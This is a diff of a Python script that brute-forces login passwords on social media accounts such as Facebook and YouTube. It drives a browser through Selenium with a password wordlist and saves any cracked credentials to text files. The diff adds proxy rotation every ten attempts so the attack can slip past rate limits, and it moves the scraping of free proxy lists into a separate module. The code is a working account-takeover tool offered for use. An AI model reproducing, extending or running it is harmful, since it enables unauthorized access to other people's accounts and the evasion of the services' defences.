@@ -1,5 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+from ast import For
 import smtplib
 import threading
 from optparse import *
@@ -7,6 +8,7 @@ import time
 import sys
 import io
 import os
+from GetProxy import getProxies
 try:
     from selenium import webdriver
 except:
@@ -25,9 +27,6 @@ try:
     from colorama import Fore, Back, Style
 except:
     os.system("pip install colorama")
-R = '\033[31m'  # red
-G = '\033[32m'  # green
-W = '\033[0m'  # white (normal)
 use = OptionParser("""{}
 ============================================================================================
 -> --getproxylist                   export_filename (E.x: proxy_list.txt)
@@ -43,6 +42,7 @@ use = OptionParser("""{}
 -b --biztime                        ACCOUNT biztime
 -H --hahalolo                       ACCOUNT hahalolo
 -l --list                           List    Password BruteForce
+-h --help                           Show this help message and exit
 ============================================================================================
 {}""".format(Fore.LIGHTCYAN_EX, Fore.RESET))
 
@@ -77,420 +77,26 @@ use.add_option("-l", "--list", dest="list_password",
 
 
 def getProxyList():
-    if options.type != None:
-        types = str(options.type).split("|")
-        index_type = []
-        for t in types:
-            index_type.append(social_name.index(t))
-    else:
-        index_type = [0, 1, 2, 3, 4, 5, 6, 7]
-    # -------------------------------------------------------
-    proxy = Proxy()
-    proxy.proxy_type = ProxyType.MANUAL
-    capabilities = webdriver.DesiredCapabilities.FIREFOX
-    proxy.http_proxy = ''
-    proxy.ssl_proxy = ''
-    proxy.add_to_capabilities(capabilities)
-    ops = Options()
-    ops.headless = True
-    # --------------------------------------------------------
-    func_load = [getProxyList_switcher,
-                 getProxyList_spys_1, getProxyList_spys_2, getProxyList_spys_3, getProxyList_free_proxy_list, getProxyList_cybersyndrome_1, getProxyList_cybersyndrome_2, getProxyList_cybersyndrome_3, getProxyList_foxtools, getProxyList_premproxy_1, getProxyList_premproxy_2, getProxyList_premproxy_3]
-    threads_get = []
-    threads_webdriver = []
-    for index_func in range(0, len(func_load)):
-        if index_func == 0:
-            threads_get.append(threading.Thread(
-                target=func_load[index_func], args=(index_type,), name="Thread_"+str(index_func), daemon=True))
-        else:
-            threads_webdriver.append(None)
-            threads_get.append(threading.Thread(
-                target=func_load[index_func], args=(ops, capabilities, index_type, threads_webdriver, index_func-1), name="Thread_"+str(index_func), daemon=True))
-    for thread_get in threads_get:
-        thread_get.start()
-    # --------------------------------------------------------
-    print(Fore.LIGHTMAGENTA_EX +
-          "[!] Starting load proxies from webs"+Fore.RESET)
-    while input(Fore.LIGHTMAGENTA_EX +
-                "[!] If you want to stop getting proxies, press enter..."+Fore.RESET+'\n') != "":
-        continue
-    for driver in threads_webdriver:
-        if driver != None:
-            driver.quit()
-    print(Fore.LIGHTMAGENTA_EX +
-          "[!] Stopped get proxies from webs")
-    os.system('taskkill /f /im geckodriver.exe')
-    print(Fore.RESET)
-    sys.exit(1)
+    getProxies(options.getproxylist, options.type)
 
 
-def getProxyList_switcher(index_type):
-    try:
-        io.open("proxy_list_switcher.txt", "a+")
-        get_str = io.open("proxy_list_switcher.txt", "r").readlines()
-        for i in range(1, len(get_str)):
-            check_proxy(get_str[i].split(",")[0], index_type)
-    except:
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!] Error get proxy from switcher"+Fore.RESET)
-
-
-def getProxyList_spys_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    try:
-        url = ("https://spys.one/en/free-proxy-list/")
-        first_get = True
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        driver.get(url)
-        check_1 = driver.find_element(
-            By.XPATH, "//tbody/tr[3]/td[1]/font[1]").text
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get(url)
-                        check_2 = driver.find_element(
-                            By.XPATH, "//tbody/tr[3]/td[1]/font[1]").text
-                        if check_1 != check_2:
-                            check_1 = check_2
-                            break
-                        driver.quit()
-                        time.sleep(120)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            proxies = []
-            for row in range(3, 33):
-                proxies.append(driver.find_element(
-                    By.XPATH, "//tbody/tr["+str(row)+"]/td[1]/font[1]").text)
-            driver.quit()
-            for proxy in proxies:
-                check_proxy(proxy, index_type)
-            first_get = False
-    except:
-        print(Fore.LIGHTMAGENTA_EX+"[!] Error get proxy from "+url+Fore.RESET)
-        driver.quit()
-
-
-def getProxyList_spys_txt(ops, capabilities, index_type, url, threads_webdriver, index_in_threads_webdriver):
-    i = 1 if url == "https://spys.me/proxy.txt" else 2
-    try:
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        first_get = True
-        driver.get(url)
-        check_1 = driver.find_element(
-            By.XPATH, "//body/pre").text.split("\n")
-        driver.quit()
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get(url)
-                        check_2 = driver.find_element(
-                            By.XPATH, "//body/pre").text.split("\n")
-                        driver.quit()
-                        if check_1[1] != check_2[1]:
-                            check_1 = check_2
-                            break
-                        time.sleep(600)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            for i in range(6, len(check_1)-2):
-                check_proxy(check_1[i].split(" ")[0], index_type)
-            first_get = False
-    except:
-        driver.quit()
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!] Error get proxy from "+url+Fore.RESET)
-
-
-def getProxyList_spys_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_spys_txt(ops, capabilities, index_type,
-                          "https://spys.me/proxy.txt", threads_webdriver, index_in_threads_webdriver)
-
-
-def getProxyList_spys_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_spys_txt(ops, capabilities, index_type,
-                          "https://spys.me/socks.txt", threads_webdriver, index_in_threads_webdriver)
-
-
-def getProxyList_free_proxy_list(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    try:
-        url = "https://free-proxy-list.net/"
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        first_get = True
-        driver.get(url)
-        check_1 = driver.find_element(
-            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[1]").text+":"+driver.find_element(
-            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[2]").text
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get(url)
-                        check_2 = driver.find_element(
-                            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[1]").text+":"+driver.find_element(
-                            By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr[1]/td[2]").text
-                        if check_1 != check_2:
-                            check_1 = check_2
-                            break
-                        driver.quit()
-                        time.sleep(120)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            proxies = []
-            for row in range(1, 70):
-                proxies.append(driver.find_element(
-                    By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr["+str(row)+"]/td[1]").text+":"+driver.find_element(
-                    By.XPATH, "//table[@class='table table-striped table-bordered']/tbody/tr["+str(row)+"]/td[2]").text)
-            driver.quit()
-            for proxy in proxies:
-                check_proxy(proxy, index_type)
-            first_get = False
-    except:
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!] Error get proxy from "+url+Fore.RESET)
-        driver.quit()
-
-
-def getProxyList_cybersyndrome(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver, index_url):
-    try:
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        first_get = True
-        cybersyndrome_url = ["http://www.cybersyndrome.net/plr6.html",
-                             "http://www.cybersyndrome.net/pla6.html", "http://www.cybersyndrome.net/pld6.html"]
-        driver.get(cybersyndrome_url[index_url])
-        check_1 = driver.find_element(
-            By.XPATH, "//div[@id='content']/div[2]/span").text
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get(cybersyndrome_url[index_url])
-                        check_2 = driver.find_element(
-                            By.XPATH, "//div[@id='content']/div[2]/span").text
-                        if check_1 != check_2:
-                            check_1 = check_2
-                            break
-                        driver.quit()
-                        time.sleep(300)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            proxies = []
-            if index_url == 0:
-                for row in range(1, 31):
-                    proxies.append(driver.find_element(
-                        By.XPATH, "//td[@id='n"+str(row)+"']").text)
-            else:
-                for row in range(1, int(driver.find_element(By.XPATH, "//div[@id='content']/div[2]/span[2]").text)+1):
-                    proxies.append(driver.find_element(
-                        By.XPATH, "//a[@id='n"+str(row)+"']").text)
-            driver.quit()
-            for proxy in proxies:
-                check_proxy(proxy, index_type)
-            first_get = False
-    except:
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!"+index_url+"] Error get proxy from http://www.cybersyndrome.net"+Fore.RESET)
-        driver.quit()
-
-
-def getProxyList_cybersyndrome_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_cybersyndrome(ops, capabilities, index_type,
-                               threads_webdriver, index_in_threads_webdriver, 0)
-
-
-def getProxyList_cybersyndrome_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_cybersyndrome(ops, capabilities, index_type,
-                               threads_webdriver, index_in_threads_webdriver, 1)
-
-
-def getProxyList_cybersyndrome_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_cybersyndrome(ops, capabilities, index_type,
-                               threads_webdriver, index_in_threads_webdriver, 2)
-
-
-def getProxyList_foxtools(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    try:
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        first_get = True
-        driver.get("http://foxtools.ru/Proxy?page=1")
-        check_1 = driver.find_element(
-            By.XPATH, "//table[@id='theProxyList']/tbody/tr[1]/td[2]").text
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get("http://foxtools.ru/Proxy?page=1")
-                        check_2 = driver.find_element(
-                            By.XPATH, "//table[@id='theProxyList']/tbody/tr[1]/td[2]").text
-                        if check_1 != check_2:
-                            check_1 = check_2
-                            break
-                        driver.quit()
-                        time.sleep(300)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            proxies = []
-            for i in range(1, 3):
-                driver.get("http://foxtools.ru/Proxy?page="+str(i))
-                driver.implicitly_wait(5)
-                for row in range(1, 31):
-                    proxies.append(driver.find_element(
-                        By.XPATH, "//table[@id='theProxyList']/tbody/tr["+str(row)+"]/td[2]").text)
-            driver.quit()
-            for proxy in proxies:
-                check_proxy(proxy, index_type)
-            first_get = False
-    except:
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!] Error get proxy from http://foxtools.ru/Proxy"+Fore.RESET)
-        driver.quit()
-
-
-def getProxyList_premproxy(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver, a, b):
-    try:
-        driver = webdriver.Firefox(
-            options=ops, desired_capabilities=capabilities)
-        threads_webdriver[index_in_threads_webdriver] = driver
-        driver.implicitly_wait(5)
-        first_get = True
-        driver.get("https://premproxy.com/list/time-0"+str(a)+".htm")
-        check_1 = driver.find_element(
-            By.XPATH, "//table[@id='proxylistt']/tbody/tr[1]/td[1]").text
-        while True:
-            if not first_get:
-                while True:
-                    try:
-                        driver = webdriver.Firefox(
-                            options=ops, desired_capabilities=capabilities)
-                        threads_webdriver[index_in_threads_webdriver] = driver
-                        driver.implicitly_wait(5)
-                        driver.get(
-                            "https://premproxy.com/list/time-0"+str(a)+".htm")
-                        check_2 = driver.find_element(
-                            By.XPATH, "//table[@id='proxylistt']/tbody/tr[1]/td[1]").text
-                        if check_1 != check_2:
-                            check_1 = check_2
-                            break
-                        driver.quit()
-                        time.sleep(300)
-                    except KeyboardInterrupt:
-                        raise KeyboardInterrupt
-                    except:
-                        driver.quit()
-            proxies = []
-            for i in range(a, b+1):
-                driver.get(
-                    "https://premproxy.com/list/time-0"+str(i)+".htm")
-                for row in range(1, 53 if i != 7 else 30):
-                    proxies.append(driver.find_element(
-                        By.XPATH, "//table[@id='proxylistt']/tbody/tr["+str(row)+"]/td[1]").text)
-            driver.quit()
-            for proxy in proxies:
-                check_proxy(proxy, index_type)
-            first_get = False
-    except Exception as e:
-        print(e)
-        print(Fore.LIGHTMAGENTA_EX +
-              "[!"+str(index_in_threads_webdriver)+"] Error get proxy from https://premproxy.com/list" + Fore.RESET)
-        driver.quit()
-
-
-def getProxyList_premproxy_1(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_premproxy(ops, capabilities, index_type,
-                           threads_webdriver, index_in_threads_webdriver, 1, 2)
-
-
-def getProxyList_premproxy_2(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_premproxy(ops, capabilities, index_type,
-                           threads_webdriver, index_in_threads_webdriver, 3, 4)
-
-
-def getProxyList_premproxy_3(ops, capabilities, index_type, threads_webdriver, index_in_threads_webdriver):
-    getProxyList_premproxy(ops, capabilities, index_type,
-                           threads_webdriver, index_in_threads_webdriver, 5, 7)
-
-    # ================================CHECK AND Export PROXY=============================
-url_list = ['https://www.facebook.com/login', 'https://www.youtube.com/',
-            'https://www.instagram.com', 'https://www.tiktok.com/login/phone-or-email/email', 'https://twitter.com/i/flow/login', 'https://www.gapo.vn/', 'https://biztime.com.vn/', 'https://accounts.hahalolo.com/sign-in/']
-social_name = ['facebook', 'youtube', 'instagram',
-               'tiktok', 'twitter', 'gapo', 'biztime', 'hahalolo']
-
-
-def check_proxy(myproxy, index_type):
-    for s in index_type:
-        try:
-            io.open(options.getproxylist, "a+")
-            list_in_file = io.open(options.getproxylist, "r").readlines()
-            get_str = "" if len(list_in_file) == 0 else list_in_file.pop()
-            if not social_name[s]+"-"+myproxy in get_str:
-                requests.get(url_list[s],
-                             proxies={'https': myproxy, 'http': myproxy}, timeout=1)
-                io.open(options.getproxylist, "w").write(
-                    social_name[s]+"-"+myproxy+","+get_str)
-                print(Fore.LIGHTGREEN_EX+"[V]"+social_name[s] +
-                      "-"+myproxy+Fore.RESET)
-        except:
-            print(Fore.LIGHTRED_EX+"[X]"+social_name[s] +
-                  "-"+myproxy+Fore.RESET)
-
-
-# =================================LOAD PROXY==============================
+    # =================================LOAD PROXY==============================
 proxy_list = []
 
 
 def load_proxy_list(socialname):
-    proxy_list.clear()
-    proxies = io.open(options.loadproxylist, "r").readlines().pop().split(',')
-    for i in range(0, len(proxies)-1):
-        element_proxy = proxies[i].split('-')
-        if element_proxy[0] == socialname:
-            proxy_list.append(element_proxy[1])
-
+    while True:
+        try:
+            proxies = io.open(options.loadproxylist,
+                              "r").readlines().pop().split(',')
+            for i in range(0, len(proxies)-1):
+                element_proxy = proxies[i].split('-')
+                if element_proxy[0] == socialname:
+                    proxy_list.append(element_proxy[1])
+            break
+        except:
+            print(Fore.LIGHTMAGENTA_EX+"[i] File proxy error"+Fore.RESET)
+            time.sleep(30)
 # ==============================CHANGE PROXY===============================
 
 
@@ -534,31 +140,34 @@ def load_password_list():
 def facebook():
     count_while = 0
     count_login = 0
-    print("\r{}Facebook Account: {}".format(R, options.facebook))
-    print("%s<<<<<<+++++Start  Attacking Facebook+++++>>>>>%s" % (R, W))
-    brows = webdriver.Firefox()
-    brows.set_page_load_timeout(60)
+    print("{}Facebook Account: {}".format(R, options.facebook))
+    print("{}<<<<<<+++++Start Attacking Facebook+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
     while count_while < len(password_list):
         try:
+            password = password_list[count_while]
             if count_login % 10 == 0:
-                changeProxy()
-            brows.get("https://facebook.com/login")
-            try:
-                brows.find_element(
-                    By.XPATH, "//*[@id='facebook']/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]").click()
-            except:
-                count_login
-            try:
-                brows.find_element(
-                    By.XPATH, "//div[@id='content']/div/div/div[3]/div/div/label/input").click()
-                count_login = 0
-                continue
-            except:
-                count_login
+                brows = webdriver.Firefox(
+                    desired_capabilities=changeProxy('facebook'))
+                brows.set_page_load_timeout(30)
+                brows.implicitly_wait(5)
+                brows.get("https://facebook.com/login")
+                try:
+                    brows.find_element(
+                        By.XPATH, "//*[@id='facebook']/body/div[3]/div[2]/div/div/div/div/div[3]/button[2]").click()
+                except:
+                    print
+                try:
+                    brows.find_element(
+                        By.XPATH, "//div[@id='content']/div/div/div[3]/div/div/label/input").click()
+                    count_login = 0
+                    continue
+                except:
+                    print
             brows.find_element(By.ID, "email").send_keys(options.facebook)
-            print('\rPassword [==] {} '.format(password_list[count_while]))
+            print(Fore.LIGHTYELLOW_EX +
+                  'Password [==] '+password+Fore.RESET)
             brows.find_element(By.ID, "pass").send_keys(
-                password_list[count_while])
+                password)
             brows.find_element(By.ID, "loginbutton").click()
             try:
                 if brows.find_element(By.XPATH, "//div[@id='error_box']/div").text == "Access Denied":
@@ -567,21 +176,25 @@ def facebook():
             except:
                 count_login
             if 'https://www.facebook.com/?sk=welcome' in brows.current_url or 'https://www.facebook.com/checkpoint' in brows.current_url:
-                print("{}[True][+] Password Found [{}][+]".format(G,
-                      password_list[count_login]))
+                print("{}[V] Password Found [{}]{}".format(
+                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                 io.open("Facebook.txt", "a").write(
                     options.facebook+":"+password_list[count_login]+"\n")
                 break
-            print("%s[!] False Login Password%s\n" % (R, W))
+            print(Fore.LIGHTRED_EX+"[X] "+password+Fore.RESET)
             count_login += 1
             count_while += 1
-        except TimeoutException:
-            print('[!] <<<Time out. Again>>> \n')
+        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
+            brows.quit()
             count_login = 0
             continue
         except Exception as e:
-            print('[!] <<<There are speeches in Communication>>> \n')
             print(e)
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Fore Stopping...'+Fore.RESET)
+            brows.quit()
             break
 
 # ==================================YOUTUBE======================================
@@ -590,8 +203,8 @@ def facebook():
 
 
 def youtube():
-    print("\rYoutube Account: {}".format(options.youtube))
-    print("%s<<<<<<+++++Start  Attacking Youtube+++++>>>>>%s" % (R, W))
+    print("Youtube Account: {}".format(options.youtube))
+    print("{}<<<<<<+++++Start  Attacking Youtube+++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
     brows = webdriver.Firefox(executable_path=r"geckodriver.exe")
     brows.get("https://www.youtube.com/")
     try:
@@ -615,16 +228,25 @@ def youtube():
             brows.find_element(By.ID, "loginbutton").click()
             brows.find_element(By.ID, "identifierNext").click()
             if 'https://www.youtube.com' in brows.current_url:
-                print(
-                    "{}[True][+] Password Found [{}][+]".format(G, password))
+                print("{}[V] {}{}".format(
+                    Fore.LIGHTGREEN_EX, password, Fore.RESET))
                 io.open("Youtube.txt", "a").write(
                     options.youtube+":"+password+"\n")
                 break
             else:
-                print("%s[!] False Login Password%s\n" % (R, W))
+                print("{}[X] {}{}".format(
+                    Fore.LIGHTRED_EX, password, Fore.RESET))
+        except (TimeoutException, selenium.common.exceptions.WebDriverException, selenium.common.exceptions.NoSuchWindowException, selenium.common.exceptions.NoSuchElementException):
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Force Error!!!. Again'+Fore.RESET)
+            brows.quit()
+            count_login = 0
+            continue
         except Exception as e:
-            print('[!] <<<There are speeches in Communication>>> \n')
             print(e)
+            print(Fore.LIGHTMAGENTA_EX +
+                  '[!] Brute Fore Stopping...'+Fore.RESET)
+            brows.quit()
             break
 
 
@@ -985,7 +607,7 @@ def hahalolo():
     count_while = 0
     count_login = 0
     print("\rHahalolo Account: {}".format(options.hahalolo))
-    print("%s<<<<<<+++++Start Attacking Hahalolo++++>>>>>%s" % (R, W))
+    print("{}<<<<<<+++++Start Attacking Hahalolo++++>>>>>{}".format(Fore.LIGHTRED_EX, Fore.RESET))
     while count_while < len(password_list):
         try:
             password = password_list[count_while]
@@ -1046,10 +668,6 @@ try:
     check = False
     if options.getproxylist != None:
         getProxyList()
-        # get_proxy_list = threading.Thread(
-        #     target=getProxyList, name="getProxyList")
-        check = True
-        # get_proxy_list.start()
     if options.twitter != None:
         twitter = threading.Thread(target=twitter, name="twitter")
         check = True
